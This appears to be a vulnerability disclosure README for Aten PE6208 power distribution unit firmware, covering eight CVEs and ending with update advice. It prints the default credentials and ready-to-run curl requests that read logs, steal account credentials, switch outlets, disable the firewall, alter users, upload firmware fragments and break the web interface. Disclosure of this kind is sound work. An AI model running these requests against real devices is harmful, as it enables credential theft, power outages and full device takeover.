# Aten PE6208 vulnerabilities

This repo contains a description of the vulnerabilities identified
in the Aten PE6208 PDU firmware. The exploitation methods described were
tested for versions v2.3.228 and v2.4.232 of the PE6208 firmware. According
to Aten, the vulnerabilities are fixed in the v2.4.239 firmware version.

## The vulnerabilities

1. Default credentials (CVE-2023-43844, CVE-2023-43845)
-------------------------------------------------------
### _A user isn't suggested to change default credentials_
Device can be managed via web interface or via telnet. Both methods use
privileged accounts with default credentials:
```
	administrator : password # for web
	teladmin : telpwd        # for telnet
```
The firmware doesn't force to change default credentials. If they're
not changed, attackers can get privileged access.

2. Incorrect Access Control (CVE-2023-43846)
--------------------------------------------
### _Unauthenticated logs access_
Logs on device can be accessed without authentication via GET request:
```
curl -s -i -k 'https://192.168.0.60/Log_information/Systemlog.csv'
```
Logs contain such information as usernames present on the device
and IP addresses of the device users.

3. Incorrect Access Control (CVE-2023-43843)
--------------------------------------------
### _Unprivileged user can other users' credentials_
An attacker provided with a valid unprivileged session ID can read credentials
of all accounts, including privileged ones, via GET request:
```
curl -s -i -k 'https://192.168.0.60/xml/accounts.xml?SID=1234567890abcdef&SIndex=0&UID=8
```
Attackers can use the credentials obtained this way to login as other users on
the device or to perform password spraying attacks on the rest of the
infrastructure.

4. Incorrect Access Control (CVE-2023-43847)
--------------------------------------------
### _Unprivileged user can access outlets management_
An attacker provided with a valid unprivileged session ID can control outlets
via POST requests.
To turn an outlet off:
```
curl -s -i -k 'https://192.168.0.60/outlet_access/connections.cgi?SID=1234567890abcdef&SIndex=0&UID=8' -X POST -d 'outcont401=0'
```
To turn an outlet on:
```
curl -s -i -k 'https://192.168.0.60/outlet_access/connections.cgi?SID=1234567890abcdef&SIndex=0&UID=8' -X POST -d 'outcont401=1'
```

5. Incorrect Access Control (CVE-2023-43848)
--------------------------------------------
### _Unprivileged user can access firewall management_
An attacker provided with a valid unprivileged session ID can control
the device's local firewall rules via POST request:
```
curl -s -i -k 'https://192.168.0.60/device_management/security.cgi?SID=1234567890abcdef&SIndex=0&UID=8' -X POST -d 'devsecuip01=0.0.0.0&devsecuip06=0.0.0.0'
```
The rules may be modified or completely disabled, which may allow attackers
to access the device.

6. Incorrect Access Control (CVE-2023-43842)
--------------------------------------------
### _Unprivileged user can alter the device user accounts_
An attacker provided with a valid unprivileged session ID can add, remove
and change existing accounts of unprivileged users on the device.
To set user test's password to "test":
```
curl -s -i -k 'https://192.168.0.60/user_management/accounts.cgi?SID=1234567890abcdef&SIndex=0&UID=8' -X POST -d 'u303=1&u103=test&u203=test&'
```
To disable a user by number:
curl -s -i -k 'https://192.168.0.60/user_management/accounts.cgi?SID=1234567890abcdef&SIndex=0&UID=8' -X POST -d 'u303=0&'

7. Incorrect Access Control (CVE-2023-43849)
--------------------------------------------
### _Unprivileged user can upload firmware fragments_
New firmware upload process is based on sending payload fragments via POST
requests without any authentication. An attacker can use it to interfere with
a firmware update process like this:
```
curl -s -i -k 'https://192.168.0.60/xml/firmware_upgrade.xml?SID=evwdiub3kaf6pco4&CheckVersion=0&Name=administrator'
curl -s -i -k 'https://192.168.0.60/maintenance/fwupgrade.cgi' -X POST -d '------WebKitFormBoundary1234567890ABCdef\nContent-Disposition: form-data; name="FWfileName"; filename="payload.bin"\nContent-Type: application/octet-stream\n$FRAGMENT
```
Looped requests like this may be used to upload modified firmware containing
malicious code resulting in fully compromised device.
After such a manipulation a legitimate firmware upload may be not possible.

8. Improper Input Validation (CVE-2023-43850)
---------------------------------------------
### _Unprivileged user can cause partial DoS of web interface_
If an attacker provided with a valid unprivileged session ID adds a user with
a name containing opening angle bracket, a partial DoS of web interface
happens. While such a user is present, administrator can't see list of users
or edit accounts. Also logs are not available for viewing while containing
a record with such a name of user:
```
curl -s -i -k 'https://192.168.0.60/user_management/accounts.cgi?SID=1234567890abcdef&SIndex=0&UID=8' -X POST -d 'u303=1&u103=<&u203=test&'
```
## Remediation
Since according to Aten the issues are solved in v.2.4.239 firmware version,
to avoid potential risks a customer should update their device firmware
to this version. The firmware is avalaible at the [official site](https://www.aten.com/global/en/products/power-distribution-&-racks/rack-pdu/pe6208/) of Aten
at the _Support and Downloads_ tab.
